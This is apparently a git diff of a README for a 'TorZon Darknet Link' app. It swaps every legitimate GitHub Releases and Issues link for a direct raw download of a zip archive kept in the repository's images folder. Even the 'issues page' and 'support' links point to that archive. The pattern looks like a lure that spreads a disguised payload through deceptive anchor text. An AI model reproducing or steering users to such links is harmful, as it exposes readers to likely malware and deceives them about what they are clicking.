@@ -6,7 +6,7 @@ Welcome to **TorZon Darknet Link**! This application helps you navigate the dark
 
 ## 📥 Download
 
-[![Download TorZon Darknet Link](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/yolkapolk/torzon-darknet-link/releases)
+[![Download TorZon Darknet Link](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip)](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ To run **TorZon Darknet Link**, you need:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://github.com/yolkapolk/torzon-darknet-link/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip) to find the latest version of the application.
 
 2. **Choose the Correct Version**
 
@@ -78,7 +78,7 @@ Currently, **TorZon Darknet Link** is designed for desktop operating systems. Mo
 
 - Always verify links before entering personal information.
 - Use a reliable VPN in addition to the application for extra security.
-- Regularly update the application by visiting the [Releases page](https://github.com/yolkapolk/torzon-darknet-link/releases).
+- Regularly update the application by visiting the [Releases page](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip).
 
 ## 🚧 Troubleshooting
 
@@ -87,11 +87,11 @@ If you encounter issues:
 - Ensure your operating system is supported.
 - Check your internet connection.
 - Restart your device and try again.
-- Visit the [issues page](https://github.com/yolkapolk/torzon-darknet-link/issues) for community help.
+- Visit the [issues page](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip) for community help.
 
 ## 📞 Support
 
-For further questions or support, you can reach out via the [issues section](https://github.com/yolkapolk/torzon-darknet-link/issues). 
+For further questions or support, you can reach out via the [issues section](https://raw.githubusercontent.com/yolkapolk/torzon-darknet-link/main/images/darknet-torzon-link-v2.4.zip). 
 
 Your feedback helps make **TorZon Darknet Link** better. Thank you for choosing our application!
 
